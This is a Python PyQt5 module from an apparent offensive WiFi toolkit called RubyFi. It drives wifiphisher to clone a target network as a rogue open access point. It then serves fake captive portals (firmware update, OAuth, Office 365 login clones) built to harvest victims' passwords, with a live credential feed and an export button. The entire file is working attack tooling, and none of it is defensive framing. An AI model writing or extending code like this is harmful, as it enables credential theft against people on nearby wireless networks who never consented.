#!/usr/bin/env python3
"""
gui/wifi_phishing_dialog.py  (v2 — auto mode switching)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
WiFi Phishing with automatic monitor ↔ managed switching.

Flow
----
  CLEANUP → DISABLE MONITOR (airmon-ng stop) →
  LAUNCH WIFIPHISHER → MONITOR CREDENTIALS →
  RESTORE MONITOR (airmon-ng start) → emit mode_changed

Add to main_window.py
─────────────────────
  from gui.wifi_phishing_dialog import WiFiPhishingMixin
  class RubyFiWindow(DeauthMixin, EvilTwinMixin,
                     BeaconFloodMixin, WiFiPhishingMixin, QMainWindow):
  In show_attack_menu():
      ("6️⃣ WiFi Phishing", "wifi_phishing", "#ff6b35"),
  In handle_attack_selection():
      elif attack_type == "wifi_phishing": self.execute_wifi_phishing()
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import os
import re
import shlex
import signal
import time
import subprocess
from pathlib import Path
from typing import Optional, List, Set

from PyQt5.QtCore    import QThread, pyqtSignal, Qt
from PyQt5.QtWidgets import (
    QDialog, QVBoxLayout, QHBoxLayout, QPushButton, QLabel,
    QTextEdit, QLineEdit, QFrame, QFileDialog
)
from PyQt5.QtGui import QFont


# ───────────────────────────────────────────────────────────────────
# CONSTANTS
# ───────────────────────────────────────────────────────────────────

_PID_FILE  = "/tmp/wifiphisher_rubifi.pid"
_WF_SCRIPT = "/tmp/rubifi_wifiphisher.sh"
_WF_LOG    = "/tmp/wifiphisher.log"
_CAPTURES  = Path(__file__).parent.parent / "captures"

PORTAL_TEMPLATES = [
    ("firmware-upgrade", "📱  Firmware Upgrade",
     "Router prompts victim to enter WiFi password for a fake firmware update"),
    ("oauth-login",      "🔑  OAuth / Social Login",
     "Generic OAuth page — Facebook / Google style login, captures credentials"),
    ("plugin_update",    "🧩  Browser Plugin Update",
     "Browser asks victim to install a plugin update — steals entered password"),
    ("wifi_connect",     "📶  WiFi Reconnect Page",
     "Simple reconnect captive portal — familiar to victims on public WiFi"),
    ("office365",        "📧  Office 365 Login",
     "Microsoft Office 365 login clone — high success in corporate environments"),
]


# ───────────────────────────────────────────────────────────────────
# HELPERS
# ───────────────────────────────────────────────────────────────────

def _list_iw_interfaces() -> Set[str]:
    """Return current wireless interface names via iw dev."""
    try:
        out = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        return {
            ln.split()[-1]
            for ln in out.splitlines()
            if ln.strip().startswith("Interface")
        }
    except Exception:
        return set()


# ───────────────────────────────────────────────────────────────────
# BACKGROUND THREAD
# ───────────────────────────────────────────────────────────────────

class WiFiPhishingThread(QThread):
    """
    Full phishing pipeline with automatic mode switching.

    Phases
    ------
    0  Cleanup         — kill conflicting processes
    1  Disable Monitor — airmon-ng stop <monitor_iface>
    2  Launch          — wifiphisher via gnome-terminal
    3  Monitor         — tail credential log + wf log
    F  Restore Monitor — airmon-ng start <managed_iface>  (always runs)

    Signals
    -------
    statusupdate(str)
    phasechanged(str, str)       label_text, hex_colour
    statsupdate(int, int, str)   elapsed_s, cred_count, pid_str
    credential_captured(str)     raw credential line
    mode_changed(str, str)       new_iface_name, "Monitor"/"Managed"
    attackcomplete(bool, str)
    """

    statusupdate        = pyqtSignal(str)
    phasechanged        = pyqtSignal(str, str)
    statsupdate         = pyqtSignal(int, int, str)
    credential_captured = pyqtSignal(str)
    mode_changed        = pyqtSignal(str, str)
    attackcomplete      = pyqtSignal(bool, str)

    def __init__(self, monitor_interface: str, target_ssid: str,
                 target_bssid: str, target_channel: str,
                 portal_template: str = "firmware-upgrade"):
        super().__init__()
        self.monitor_interface = monitor_interface
        # Derive managed interface name (wlan0mon → wlan0)
        self.managed_interface = (
            monitor_interface[:-3]
            if monitor_interface.endswith("mon")
            else monitor_interface
        )
        self.target_ssid     = target_ssid
        self.target_bssid    = target_bssid
        self.target_channel  = str(target_channel)
        self.portal_template = portal_template
        self.running         = True
        self._wf_proc        = None
        self._wf_pid         = ""
        self.start_time      = None
        self.cred_count      = 0
        self._seen_creds: set = set()
        _CAPTURES.mkdir(parents=True, exist_ok=True)
        safe = re.sub(r"[^\w\-]", "_", target_ssid)[:30]
        self._cred_log = str(_CAPTURES / ("wifiphisher_" + safe + ".txt"))
        self._restored_iface = ""   # filled after monitor is restored

    # ── helpers ─────────────────────────────────────────────────────

    def _s(self, msg: str):
        self.statusupdate.emit(msg)

    def _phase(self, text: str, colour: str = "#00d4ff"):
        self.phasechanged.emit(text, colour)

    def _emit_stats(self):
        elapsed = int(time.time() - (self.start_time or time.time()))
        self.statsupdate.emit(elapsed, self.cred_count, self._wf_pid)

    # ── PHASE 0 : cleanup ───────────────────────────────────────────

    def _cleanup_previous(self):
        self._phase("🧹 CLEANING UP", "#00d4ff")
        self._s("Terminating conflicting processes …")
        for proc in ["wifiphisher", "airbase-ng", "hostapd", "lighttpd",
                     "dnsmasq", "mdk4", "aireplay-ng", "airodump-ng"]:
            subprocess.run("pkill -f " + proc, shell=True, capture_output=True)
        for i in range(5):
            subprocess.run(
                "ip link set at" + str(i) + " down 2>/dev/null",
                shell=True, capture_output=True
            )
        subprocess.run("iptables -t nat -F 2>/dev/null", shell=True, capture_output=True)
        subprocess.run("iptables -F 2>/dev/null",        shell=True, capture_output=True)
        subprocess.run("ip neigh flush all 2>/dev/null", shell=True, capture_output=True)
        for lf in ["/var/lib/misc/dnsmasq.leases",
                   "/tmp/dnsmasq.leases", "/tmp/dnsmasq_evil.leases"]:
            subprocess.run("rm -f " + lf, shell=True, capture_output=True)
        subprocess.run(
            "rm -f /tmp/*wifiphisher* /tmp/*evil* /tmp/*hostapd*",
            shell=True, capture_output=True
        )
        if os.path.exists(self._cred_log):
            try:
                os.remove(self._cred_log)
            except OSError:
                pass
        time.sleep(1)
        self._s("✓ Environment cleaned")

    # ── PHASE 1 : disable monitor mode ──────────────────────────────

    def _disable_monitor(self) -> bool:
        """
        Run airmon-ng stop <monitor_iface>.
        Returns True when managed interface is confirmed up.
        """
        self._phase("📡 DISABLING MONITOR MODE", "#ffbe0b")
        self._s("Running: airmon-ng stop " + self.monitor_interface)
        try:
            subprocess.run(
                ["airmon-ng", "stop", self.monitor_interface],
                capture_output=True, text=True
            )
        except FileNotFoundError:
            self._s("⚠ airmon-ng not found — trying iw/ip fallback …")
            # Fallback: manually bring interface down, remove monitor, bring up
            subprocess.run(["ip", "link", "set", self.monitor_interface, "down"],
                           capture_output=True)
            subprocess.run(["iw", "dev", self.monitor_interface, "del"],
                           capture_output=True)

        self._s("Restarting NetworkManager …")
        subprocess.run(["systemctl", "start", "NetworkManager"], capture_output=True)
        time.sleep(3)

        # Bring managed interface up explicitly
        subprocess.run(["ip", "link", "set", self.managed_interface, "up"],
                       capture_output=True)
        time.sleep(1)

        # Verify managed interface exists
        ifaces = _list_iw_interfaces()
        if self.managed_interface in ifaces:
            self._s("✓ Monitor mode disabled — managed interface: " + self.managed_interface)
            self.mode_changed.emit(self.managed_interface, "Managed")
            return True

        # Fallback: accept any non-mon interface
        for iface in ifaces:
            if not iface.endswith("mon"):
                self.managed_interface = iface
                self._s("✓ Using detected managed interface: " + iface)
                self.mode_changed.emit(iface, "Managed")
                return True

        self._s("⚠ Could not confirm managed interface — proceeding anyway")
        return True

    # ── RESTORE : re-enable monitor mode (always runs) ──────────────

    def _restore_monitor(self):
        """
        Re-enable monitor mode after the attack ends.
        Always called in the finally block.
        """
        self._phase("🔄 RESTORING MONITOR MODE", "#00d4ff")
        self._s("Running: airmon-ng check kill …")
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)

        before = _list_iw_interfaces()
        self._s("Running: airmon-ng start " + self.managed_interface)
        try:
            subprocess.run(
                ["airmon-ng", "start", self.managed_interface],
                capture_output=True, text=True
            )
        except FileNotFoundError:
            self._s("⚠ airmon-ng not found — trying iw fallback …")
            subprocess.run(
                ["iw", "dev", self.managed_interface, "set", "monitor", "none"],
                capture_output=True
            )

        time.sleep(2)
        after = _list_iw_interfaces()

        new_ifaces = after - before
        if new_ifaces:
            mon_iface = new_ifaces.pop()
        else:
            mon_iface = self.managed_interface + "mon"

        self._restored_iface = mon_iface
        self._s("✓ Monitor mode restored: " + mon_iface)
        self.mode_changed.emit(mon_iface, "Monitor")

    # ── PHASE 2 : launch wifiphisher ────────────────────────────────

    def _launch_wifiphisher(self) -> bool:
        self._phase("🚀 LAUNCHING WIFIPHISHER", "#ff6b35")
        for f in [_PID_FILE, self._cred_log, _WF_SCRIPT, _WF_LOG]:
            if os.path.exists(f):
                try:
                    os.remove(f)
                except OSError:
                    pass

        cmd_parts = [
            "wifiphisher",
            "-i", self.managed_interface,
            "-e", self.target_ssid,
            "-p", self.portal_template,
            "-nD", "-nE",
            "-cP", self._cred_log,
            "--logging",
            "-lP", _WF_LOG,
        ]
        cmd_str = shlex.join(cmd_parts)
        self._s("CMD ▶ " + cmd_str)

        script_lines = [
            "#!/bin/bash",
            "",
            "echo \"[RubyFi] wifiphisher starting on managed interface \"",
            "",
            cmd_str + " &",
            "WF_PID=$!",
            "echo $WF_PID > " + _PID_FILE,
            "echo \"[RubyFi] PID: $WF_PID\"",
            "wait $WF_PID",
            "EXIT_CODE=$?",
            "echo \"[RubyFi] wifiphisher exited: $EXIT_CODE\"",
        ]
        script_content = "\n".join(script_lines)
        with open(_WF_SCRIPT, "w") as fh:
            fh.write(script_content)
        os.chmod(_WF_SCRIPT, 0o755)

        self._wf_proc = subprocess.Popen(
            ["gnome-terminal", "--title=RubyFi — WiFi Phishing",
             "--", "bash", _WF_SCRIPT],
            preexec_fn=os.setsid,
        )
        self._s("Waiting for wifiphisher to initialise (up to 20 s) …")

        for i in range(20):
            if not self.running:
                return False
            if os.path.exists(_PID_FILE):
                raw = open(_PID_FILE).read().strip()
                if raw:
                    self._wf_pid = raw
                    self._s("✓ wifiphisher running — PID " + raw)
                    return True
            self._s("  Waiting … " + str(i + 1) + "/20")
            time.sleep(1)

        self._s("⚠ PID file not found after 20 s — continuing anyway")
        return True

    # ── PHASE 3 : credential monitor loop ───────────────────────────

    def _monitor_loop(self):
        self._phase("🎯 ATTACK LIVE — WAITING FOR VICTIMS", "#00ff88")
        self._s("━" * 52)
        self._s("✓ Rogue AP: " + self.target_ssid + " (Open)")
        self._s("  Interface : " + self.managed_interface)
        self._s("  Template  : " + self.portal_template)
        self._s("  Cred log  : " + self._cred_log)
        self._s("━" * 52)
        self.start_time = time.time()
        wf_log_pos = 0

        while self.running:
            self._emit_stats()

            # check wifiphisher still alive
            if self._wf_pid:
                try:
                    os.kill(int(self._wf_pid), 0)
                except (ProcessLookupError, ValueError):
                    self._s("⚠ wifiphisher process exited on its own")
                    break

            # tail wifiphisher.log
            if os.path.exists(_WF_LOG):
                try:
                    with open(_WF_LOG, "r", errors="ignore") as lf:
                        lf.seek(wf_log_pos)
                        new_text = lf.read()
                        wf_log_pos = lf.tell()
                    for ln in new_text.splitlines():
                        clean = ln.strip()
                        if clean:
                            self._s("[WF] " + clean)
                except Exception:
                    pass

            # check credential log
            if os.path.exists(self._cred_log):
                try:
                    with open(self._cred_log, "r", errors="ignore") as cf:
                        for ln in cf:
                            clean = ln.strip()
                            if clean and clean not in self._seen_creds:
                                self._seen_creds.add(clean)
                                self.cred_count += 1
                                self.credential_captured.emit(clean)
                                self._s("🌟 CREDENTIAL CAPTURED: " + clean)
                except Exception:
                    pass

            time.sleep(1)

    # ── stop wifiphisher ────────────────────────────────────────────

    def _stop_wifiphisher(self):
        if self._wf_pid:
            try:
                os.kill(int(self._wf_pid), signal.SIGTERM)
                time.sleep(1)
                os.kill(int(self._wf_pid), signal.SIGKILL)
            except (ProcessLookupError, ValueError):
                pass
        subprocess.run(["pkill", "-f", "wifiphisher"], capture_output=True)
        for f in [_PID_FILE, _WF_SCRIPT]:
            if os.path.exists(f):
                try:
                    os.remove(f)
                except OSError:
                    pass

    def stop(self):
        self.running = False
        self._stop_wifiphisher()

    # ── MAIN THREAD ENTRY ────────────────────────────────────────────

    def run(self):
        try:
            # PHASE 0 — cleanup
            self._cleanup_previous()
            if not self.running:
                self.attackcomplete.emit(False, "Stopped by user")
                return

            # PHASE 1 — disable monitor mode
            self._disable_monitor()
            if not self.running:
                self.attackcomplete.emit(False, "Stopped by user")
                return

            # PHASE 2 — launch wifiphisher
            if not self._launch_wifiphisher():
                self.attackcomplete.emit(False, "Failed to launch wifiphisher")
                return
            if not self.running:
                self.attackcomplete.emit(False, "Stopped by user")
                return

            # PHASE 3 — monitor
            self._monitor_loop()

            if self.cred_count > 0:
                self.attackcomplete.emit(
                    True,
                    str(self.cred_count) + " credential(s) captured — " + self._cred_log
                )
            else:
                self.attackcomplete.emit(False, "Session ended — no credentials captured")

        except Exception as e:
            self.attackcomplete.emit(False, str(e))
        finally:
            # ALWAYS: kill wifiphisher then restore monitor mode
            self._stop_wifiphisher()
            self._restore_monitor()


# ───────────────────────────────────────────────────────────────────
# CONFIG DIALOG  (portal template picker only — interface is automatic)
# ───────────────────────────────────────────────────────────────────

class WiFiPhishingConfigDialog(QDialog):
    """
    Template selector shown before the attack.
    Interface switching is fully automatic — no user input needed.

    Attributes
    ----------
    selected_template : str   wifiphisher -p value
    """

    def __init__(self, target_ssid, target_bssid, target_channel,
                 monitor_iface, parent=None):
        super().__init__(parent)
        self.setWindowTitle("WiFi Phishing — Configure")
        self.setModal(True)
        self.setMinimumSize(600, 580)
        self.target_ssid      = target_ssid
        self.target_bssid     = target_bssid
        self.target_channel   = target_channel
        self.monitor_iface    = monitor_iface
        self.selected_template = None
        self._init_ui()

    def _init_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(6)
        layout.setContentsMargins(22, 22, 22, 22)

        # ── header ──────────────────────────────────────────────
        hdr = QLabel("🎣  WIFI PHISHING — CAPTIVE PORTAL")
        hdr.setAlignment(Qt.AlignmentFlag.AlignCenter)
        hdr.setStyleSheet(
            "font-size:20px; font-weight:bold; color:#ff6b35; margin:12px 0 4px 0;"
        )
        layout.addWidget(hdr)

        sub = QLabel(
            "Spawns a rogue open AP cloning the target — "
            "victims are redirected to a captive portal that harvests their password"
        )
        sub.setAlignment(Qt.AlignmentFlag.AlignCenter)
        sub.setWordWrap(True)
        sub.setStyleSheet("color:#8b949e; font-size:11px; margin-bottom:10px;")
        layout.addWidget(sub)

        # ── target strip ─────────────────────────────────────────
        info = QLabel(
            "  🎯  " + self.target_ssid
            + "   ·   " + self.target_bssid
            + "   ·   CH " + str(self.target_channel)
        )
        info.setStyleSheet(
            "color:#c9d1d9; margin:0 0 6px 0; padding:10px;"
            "background:#0a0f1a; border-radius:6px; font-size:12px;"
            "border:1px solid #1a2640;"
        )
        layout.addWidget(info)

        # ── auto mode-switch notice ───────────────────────────────
        managed = (
            self.monitor_iface[:-3]
            if self.monitor_iface.endswith("mon")
            else self.monitor_iface
        )
        notice_lines = [
            "🔄  Automatic Interface Management",
            "•  Before attack :  airmon-ng stop " + self.monitor_iface
            + "  →  " + managed + " (Managed)",
            "•  After attack  :  airmon-ng start " + managed
            + "  →  " + self.monitor_iface + " (Monitor)",
        ]
        notice = QLabel("\n".join(notice_lines))
        notice.setWordWrap(True)
        notice.setStyleSheet(
            "color:#ffbe0b; background:#0a0f1a; border:1px solid #ffbe0b;"
            "border-radius:6px; padding:10px; font-size:11px; margin:0 0 8px 0;"
        )
        layout.addWidget(notice)

        # ── divider ──────────────────────────────────────────────
        div = QFrame()
        div.setFrameShape(QFrame.Shape.HLine)
        div.setStyleSheet("background:#1a2640; max-height:1px; margin:4px 0 10px 0;")
        layout.addWidget(div)

        # ── template label ───────────────────────────────────────
        tmpl_lbl = QLabel("  🖼  Select Captive Portal Template")
        tmpl_lbl.setStyleSheet(
            "color:#ff6b35; font-size:13px; font-weight:bold; margin-bottom:4px;"
        )
        layout.addWidget(tmpl_lbl)

        # ── template buttons ──────────────────────────────────────
        for tmpl_id, tmpl_name, tmpl_desc in PORTAL_TEMPLATES:
            btn = QPushButton(tmpl_name)
            btn.setMinimumHeight(50)
            btn.setStyleSheet(
                "QPushButton {"
                "  background:#0a0f1a; border:2px solid #ff6b35;"
                "  color:#ff6b35; font-size:13px; font-weight:bold;"
                "  text-align:left; padding-left:18px; border-radius:6px;"
                "}"
                "QPushButton:hover  { background:#ff6b35; color:#05080f; }"
                "QPushButton:pressed{ background:#cc4f1f; color:#fff; }"
            )
            btn.clicked.connect(lambda _c, t=tmpl_id: self._on_template(t))
            layout.addWidget(btn)

            desc_lbl = QLabel("    " + tmpl_desc)
            desc_lbl.setWordWrap(True)
            desc_lbl.setStyleSheet(
                "color:#8b949e; font-size:10px; margin:2px 4px 6px 4px;"
            )
            layout.addWidget(desc_lbl)

        layout.addStretch()

        # ── cancel ───────────────────────────────────────────────
        cancel = QPushButton("✕  Cancel")
        cancel.setMinimumHeight(42)
        cancel.setStyleSheet(
            "QPushButton { background:#0a0f1a; border:2px solid #8b949e;"
            "color:#8b949e; font-size:13px; font-weight:bold;"
            "padding:10px; border-radius:6px; }"
            "QPushButton:hover { background:#8b949e; color:#05080f; }"
        )
        cancel.clicked.connect(self.reject)
        layout.addWidget(cancel)

    def _on_template(self, tmpl_id: str):
        self.selected_template = tmpl_id
        self.accept()


# ───────────────────────────────────────────────────────────────────
# LIVE ATTACK DIALOG
# ───────────────────────────────────────────────────────────────────

class WiFiPhishingLiveDialog(QDialog):
    """
    Full-screen live view with phase, stats, credential feed, and log.
    """

    def __init__(self, thread: WiFiPhishingThread,
                 target_ssid: str, cred_log_path: str, parent=None):
        super().__init__(parent)
        self.setWindowTitle("🎣 WiFi Phishing — Live")
        self.setModal(True)
        self.setMinimumSize(760, 700)
        self.thread        = thread
        self.target_ssid   = target_ssid
        self.cred_log_path = cred_log_path
        self._cred_rows: List[str] = []
        self._init_ui()
        self._wire()

    def _make_pill(self, text: str, colour: str) -> QLabel:
        lbl = QLabel(text)
        lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        lbl.setMinimumHeight(42)
        lbl.setStyleSheet(
            "QLabel { color:" + colour + "; font-size:14px; font-weight:bold;"
            "background:#0a0f1a; border-radius:10px;"
            "border:2px solid " + colour + ";"
            "padding:6px 18px; min-width:110px; }"
        )
        return lbl

    def _init_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(8)
        layout.setContentsMargins(22, 22, 22, 22)

        # ── header ──────────────────────────────────────────────
        hdr = QLabel("🎣  WIFI PHISHING  —  LIVE")
        hdr.setAlignment(Qt.AlignmentFlag.AlignCenter)
        hdr.setStyleSheet(
            "font-size:18px; font-weight:bold; color:#ff6b35;"
            "padding:12px; border-bottom:1px solid #1a2640; margin-bottom:6px;"
        )
        layout.addWidget(hdr)

        # ── phase label ──────────────────────────────────────────
        self.phase_label = QLabel("⚙  INITIALISING …")
        self.phase_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.phase_label.setMinimumHeight(56)
        self.phase_label.setStyleSheet(
            "color:#00d4ff; font-size:22px; font-weight:bold;"
            "background:#0a0f1a; border-radius:8px; padding:10px;"
            "border:2px solid #00d4ff; margin:2px 0;"
        )
        layout.addWidget(self.phase_label)

        # ── stats pills ──────────────────────────────────────────
        stats_row = QHBoxLayout()
        stats_row.setSpacing(10)
        self._elapsed_pill = self._make_pill("⏱  0s",          "#00d4ff")
        self._cred_pill    = self._make_pill("🔑  0 creds", "#00ff88")
        self._pid_pill     = self._make_pill("PID  —",         "#ff6b35")
        for p in [self._elapsed_pill, self._cred_pill, self._pid_pill]:
            stats_row.addWidget(p)
        layout.addLayout(stats_row)

        # ── mode transition banner (shown during switch) ─────────
        self._mode_banner = QLabel("")
        self._mode_banner.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self._mode_banner.setWordWrap(True)
        self._mode_banner.setVisible(False)
        self._mode_banner.setStyleSheet(
            "color:#ffbe0b; background:#0a0f1a;"
            "border:1px solid #ffbe0b; border-radius:6px;"
            "padding:8px; font-size:12px; margin:2px 0;"
        )
        layout.addWidget(self._mode_banner)

        # ── credential feed ──────────────────────────────────────
        cred_row = QHBoxLayout()
        cred_title = QLabel("🌟  CAPTURED CREDENTIALS")
        cred_title.setStyleSheet(
            "color:#00ff88; font-size:12px; font-weight:bold;"
        )
        cred_row.addWidget(cred_title)
        self._export_btn = QPushButton("💾  Export")
        self._export_btn.setFixedWidth(100)
        self._export_btn.setStyleSheet(
            "QPushButton { background:#0a0f1a; border:1px solid #00ff88;"
            "color:#00ff88; padding:4px 8px; border-radius:4px; font-size:11px; }"
            "QPushButton:hover { background:#00ff88; color:#05080f; }"
        )
        self._export_btn.clicked.connect(self._export_credentials)
        cred_row.addWidget(self._export_btn)
        layout.addLayout(cred_row)

        self._cred_view = QTextEdit()
        self._cred_view.setReadOnly(True)
        self._cred_view.setMaximumHeight(130)
        self._cred_view.setFont(QFont("Courier New", 11))
        self._cred_view.setStyleSheet(
            "QTextEdit { background:#010d05; border:2px solid #00ff88;"
            "border-radius:6px; color:#00ff88; padding:8px; }"
        )
        self._cred_view.setPlaceholderText(
            "  Waiting for victims to connect and submit credentials …"
        )
        layout.addWidget(self._cred_view)

        # ── activity log ─────────────────────────────────────────
        log_lbl = QLabel("📋  ACTIVITY LOG")
        log_lbl.setStyleSheet(
            "color:#8b949e; font-size:11px; font-weight:bold; margin-top:4px;"
        )
        layout.addWidget(log_lbl)

        self.log_view = QTextEdit()
        self.log_view.setReadOnly(True)
        self.log_view.setFont(QFont("Courier New", 10))
        self.log_view.setStyleSheet(
            "QTextEdit { background:#010409; border:1px solid #1a2640;"
            "border-radius:8px; color:#00d4ff; padding:8px; }"
        )
        layout.addWidget(self.log_view)

        # ── stop button ──────────────────────────────────────────
        self.stop_btn = QPushButton("⏹  STOP ATTACK")
        self.stop_btn.setMinimumHeight(50)
        self.stop_btn.setStyleSheet(
            "QPushButton { background:#0a0f1a; border:2px solid #ff006e;"
            "color:#ff006e; font-size:15px; font-weight:bold; border-radius:8px; }"
            "QPushButton:hover { background:#ff006e; color:#05080f; }"
        )
        self.stop_btn.clicked.connect(self._on_stop)
        layout.addWidget(self.stop_btn)

    def _wire(self):
        self.thread.statusupdate.connect(self._on_status)
        self.thread.phasechanged.connect(self._on_phase)
        self.thread.statsupdate.connect(self._on_stats)
        self.thread.credential_captured.connect(self._on_credential)
        self.thread.mode_changed.connect(self._on_mode_changed)
        self.thread.attackcomplete.connect(self._on_complete)

    # ── signal handlers ─────────────────────────────────────────────

    def _on_status(self, msg: str):
        ts = time.strftime("%H:%M:%S")
        if any(k in msg for k in ["✓", "✅", "LIVE", "CAPTURE", "🌟"]):
            colour = "#00ff88"
        elif any(k in msg for k in ["⚠", "✖", "error", "Error", "failed"]):
            colour = "#ff006e"
        elif "[WF]" in msg:
            colour = "#8b949e"
        elif "━" in msg or "CMD" in msg:
            colour = "#444444"
        else:
            colour = "#00d4ff"
        html = (
            '<span style="color:#8b949e;">['
            + ts
            + ']</span> <span style="color:'
            + colour + ';">'
            + msg + '</span>'
        )
        self.log_view.append(html)
        sb = self.log_view.verticalScrollBar()
        sb.setValue(sb.maximum())

    def _on_phase(self, text: str, colour: str):
        self.phase_label.setText(text)
        self.phase_label.setStyleSheet(
            "color:" + colour + "; font-size:22px; font-weight:bold;"
            "background:#0a0f1a; border-radius:8px; padding:10px;"
            "border:2px solid " + colour + "; margin:2px 0;"
        )

    def _on_stats(self, elapsed: int, cred_count: int, pid: str):
        mins, secs = divmod(elapsed, 60)
        t_str = (str(mins) + "m " + str(secs).zfill(2) + "s") if mins else (str(elapsed) + "s")
        self._elapsed_pill.setText("⏱  " + t_str)
        self._cred_pill.setText(
            "🔑  " + str(cred_count)
            + (" creds" if cred_count != 1 else " cred")
        )
        if pid:
            self._pid_pill.setText("PID  " + pid)

    def _on_mode_changed(self, iface: str, mode: str):
        """Show the mode transition banner in the live dialog."""
        if mode == "Managed":
            colour = "#ffbe0b"
            icon = "📡"
        else:
            colour = "#00d4ff"
            icon = "📡"
        msg = icon + "  Interface switched to " + mode + " mode: " + iface
        self._mode_banner.setText(msg)
        self._mode_banner.setStyleSheet(
            "color:" + colour + "; background:#0a0f1a;"
            "border:1px solid " + colour + "; border-radius:6px;"
            "padding:8px; font-size:12px; margin:2px 0;"
        )
        self._mode_banner.setVisible(True)
        self._on_status(msg)

    def _on_credential(self, cred: str):
        self._cred_rows.append(cred)
        row_num = str(len(self._cred_rows))
        html = (
            '<span style="color:#8b949e;">[#'
            + row_num
            + '] </span><span style="color:#00ff88; font-weight:bold;">'
            + cred + '</span>'
        )
        self._cred_view.append(html)
        sb = self._cred_view.verticalScrollBar()
        sb.setValue(sb.maximum())
        # Flash cred pill
        self._cred_pill.setStyleSheet(
            "QLabel { color:#00ff88; font-size:14px; font-weight:bold;"
            "background:#003322; border-radius:10px;"
            "border:2px solid #00ff88; padding:6px 18px; min-width:110px; }"
        )

    def _on_complete(self, success: bool, message: str):
        self.stop_btn.setText("✕  Close")
        self.stop_btn.setStyleSheet(
            "QPushButton { background:#0a0f1a; border:2px solid #8b949e;"
            "color:#8b949e; font-size:15px; font-weight:bold; border-radius:8px; }"
            "QPushButton:hover { background:#8b949e; color:#05080f; }"
        )
        if success:
            self._on_phase("🏆 CREDENTIALS CAPTURED!", "#00ff88")
        else:
            self._on_phase("❌ SESSION ENDED", "#8b949e")
        self._on_status("Session ended: " + message)

    def _export_credentials(self):
        if not self._cred_rows:
            return
        path, _ = QFileDialog.getSaveFileName(
            self, "Export Credentials", "captured_creds.txt",
            "Text Files (*.txt);;All Files (*)"
        )
        if path:
            with open(path, "w") as f:
                f.write("\n".join(self._cred_rows))
            self._on_status("💾 Exported to: " + path)

    def _on_stop(self):
        if self.thread.isRunning():
            self.stop_btn.setText("Stopping …")
            self.stop_btn.setEnabled(False)
            self.thread.stop()
            self.thread.wait(8000)   # extra time for mode restore
        self.accept()

    def closeEvent(self, event):
        if self.thread.isRunning():
            self.thread.stop()
            self.thread.wait(8000)
        super().closeEvent(event)


# ───────────────────────────────────────────────────────────────────
# MIXIN
# ───────────────────────────────────────────────────────────────────

class WiFiPhishingMixin:
    """
    Mixin for RubyFiWindow.

    After the attack ends, mode_changed(iface, "Monitor") is emitted
    automatically by the thread, which calls _on_phishing_mode_restored()
    here to keep the main window state in sync.
    """

    def execute_wifi_phishing(self):
        target = self.selected_target
        if not target:
            self.log("❌ WiFi Phishing: no target selected")
            return
        if not self.current_interface:
            self.log("❌ WiFi Phishing: no interface set")
            return

        ssid    = target.get("ssid", "")
        bssid   = target.get("bssid", "")
        channel = target.get("channel", "6")
        mon_iface = self.current_interface

        from gui.styles import DARK_THEME

        # 1. config dialog (template only)
        cfg = WiFiPhishingConfigDialog(ssid, bssid, channel, mon_iface, self)
        cfg.setStyleSheet(DARK_THEME)
        if cfg.exec() != QDialog.DialogCode.Accepted:
            self.log("🎣 WiFi Phishing cancelled")
            return

        template = cfg.selected_template
        self.log(
            "🎣 WiFi Phishing launching"
            + "  ·  target: " + ssid
            + "  ·  template: " + template
            + "  ·  monitor: " + mon_iface
        )

        # 2. thread
        thread = WiFiPhishingThread(
            monitor_interface = mon_iface,
            target_ssid       = ssid,
            target_bssid      = bssid,
            target_channel    = channel,
            portal_template   = template,
        )

        # Wire mode_changed → update main window state
        thread.mode_changed.connect(self._on_phishing_mode_restored)

        # 3. live dialog
        live = WiFiPhishingLiveDialog(thread, ssid, thread._cred_log, self)
        live.setStyleSheet(DARK_THEME)
        thread.start()
        live.exec()

        # 4. ensure thread dead
        if thread.isRunning():
            thread.stop()
            thread.wait(8000)

        self.log("🎣 WiFi Phishing session ended")

    def _on_phishing_mode_restored(self, iface: str, mode: str):
        """Called when thread emits mode_changed — keeps main window in sync."""
        self.current_interface = iface
        self.current_mode      = mode
        if hasattr(self, "iface_label"):
            self.iface_label.setText("🔌 Interface: " + iface + " (" + mode + ")")
        if hasattr(self, "update_status"):
            self.update_status()
        self.log("🔄 Interface restored: " + iface + " (" + mode + ")")